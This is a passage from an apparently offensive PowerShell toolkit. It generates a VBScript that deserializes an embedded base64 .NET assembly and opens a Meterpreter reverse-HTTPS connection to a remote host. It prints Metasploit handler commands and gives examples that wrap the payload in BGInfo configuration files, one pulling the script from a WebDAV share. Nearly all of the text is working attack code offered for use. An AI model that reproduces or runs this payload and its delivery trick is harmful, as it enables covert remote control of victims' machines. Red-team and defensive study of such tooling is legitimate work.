        s = s & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
        s = s & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
        s = s & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
        s = s & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
        s = s & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
        s = s & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAQAAAAGAAAgAAAAAAAAAAAAAAAAAAAAQABAAAA"
        s = s & "MAAAgAAAAAAAAAAAAAAAAAAAAQAAAAAASAAAAFhAAACcAwAAAAAAAAAAAACcAzQAAABWAFMAXwBW"
        s = s & "AEUAUgBTAEkATwBOAF8ASQBOAEYATwAAAAAAvQTv/gAAAQAAAAEAAAAAAAAAAQAAAAAAPwAAAAAA"
        s = s & "AAAEAAAAAgAAAAAAAAAAAAAAAAAAAEQAAAABAFYAYQByAEYAaQBsAGUASQBuAGYAbwAAAAAAJAAE"
        s = s & "AAAAVAByAGEAbgBzAGwAYQB0AGkAbwBuAAAAAAAAALAE/AIAAAEAUwB0AHIAaQBuAGcARgBpAGwA"
        s = s & "ZQBJAG4AZgBvAAAA2AIAAAEAMAAwADAAMAAwADQAYgAwAAAAGgABAAEAQwBvAG0AbQBlAG4AdABz"
        s = s & "AAAAAAAAACIAAQABAEMAbwBtAHAAYQBuAHkATgBhAG0AZQAAAAAAAAAAAFwAGgABAEYAaQBsAGUA"
        s = s & "RABlAHMAYwByAGkAcAB0AGkAbwBuAAAAAABDAFMAaABhAHIAcAAtAFcAZQBiAC0ATQBlAHQAZQBy"
        s = s & "AHAAcgBlAHQAZQByAEQATABMAAAAMAAIAAEARgBpAGwAZQBWAGUAcgBzAGkAbwBuAAAAAAAxAC4A"
        s = s & "MAAuADAALgAwAAAAXAAeAAEASQBuAHQAZQByAG4AYQBsAE4AYQBtAGUAAABDAFMAaABhAHIAcAAt"
        s = s & "AFcAZQBiAC0ATQBlAHQAZQByAHAAcgBlAHQAZQByAEQATABMAC4AZABsAGwAAABIABIAAQBMAGUA"
        s = s & "ZwBhAGwAQwBvAHAAeQByAGkAZwBoAHQAAABDAG8AcAB5AHIAaQBnAGgAdAAgAKkAIAAgADIAMAAx"
        s = s & "ADcAAAAqAAEAAQBMAGUAZwBhAGwAVAByAGEAZABlAG0AYQByAGsAcwAAAAAAAAAAAGQAHgABAE8A"
        s = s & "cgBpAGcAaQBuAGEAbABGAGkAbABlAG4AYQBtAGUAAABDAFMAaABhAHIAcAAtAFcAZQBiAC0ATQBl"
        s = s & "AHQAZQByAHAAcgBlAHQAZQByAEQATABMAC4AZABsAGwAAABUABoAAQBQAHIAbwBkAHUAYwB0AE4A"
        s = s & "YQBtAGUAAAAAAEMAUwBoAGEAcgBwAC0AVwBlAGIALQBNAGUAdABlAHIAcAByAGUAdABlAHIARABM"
        s = s & "AEwAAAA0AAgAAQBQAHIAbwBkAHUAYwB0AFYAZQByAHMAaQBvAG4AAAAxAC4AMAAuADAALgAwAAAA"
        s = s & "OAAIAAEAQQBzAHMAZQBtAGIAbAB5ACAAVgBlAHIAcwBpAG8AbgAAADEALgAwAC4AMAAuADAAAAAA"
        s = s & "AAAAAAAAAAAAAAAAMAAADAAAACQ2AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
        s = s & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
        s = s & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
        s = s & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
        s = s & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
        s = s & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
        s = s & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
        s = s & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
        s = s & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
        s = s & "AAAAAAAAAAAAAAENAAAABAAAAAkXAAAACQYAAAAJFgAAAAYaAAAAJ1N5c3RlbS5SZWZsZWN0aW9u"
        s = s & "LkFzc2VtYmx5IExvYWQoQnl0ZVtdKQgAAAAKCwAA"
        entry_class = "MeterPreter"
        
        Dim fmt, al, d, o
        Set fmt = CreateObject("System.Runtime.Serialization.Formatters.Binary.BinaryFormatter")
        Set al = CreateObject("System.Collections.ArrayList")
        al.Add fmt.SurrogateSelector
        
        Set d = fmt.Deserialize_2(Base64ToStream(s))
        Set o = d.DynamicInvoke(al.ToArray()).CreateInstance(entry_class)
        o.MSFConnect RHOST, RPORT, UseHTTPS
        End Sub
        
        SetVersion
        On Error Resume Next
        Run
        If Err.Number <> 0 Then
          Debug Err.Description
          Err.Clear
        End If
"@

        
Write-Output "Remember to start your handler on metasploit
msfconsole
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_https
set LHOST 0.0.0.0
set LPORT 443
set AutoRunScript post/windows/manage/migrate NAME=notepad.exe
set EnableUnicodeEncoding true
set EnableStageEncoding true
set ExitOnSession false
exploit -j"

    $Code | Out-File "$OutFilepath\$OutFile" -Encoding ascii
    }
    End
    {
    }
}


# Example 1
New-BGIFile -FileName "StartCMD.bgi" -Script "StartCMD.vbs" -OutFilePath "C:\BGIPayload"

# Example 2
New-BGIFile -FileName "MyPayload.bgi" -Script "\\10.10.10.10\webdav\VBSMeterShell.vbs" -OutFilePath "C:\BGIPayload"

# Example 3
New-VBSWebMeter -RHOST "10.10.10.10" -RPORT "443" -HTTPS "Yes" -OutFilePath "C:\BGIPayload" -OutFile "VBSMeterShell.vbs"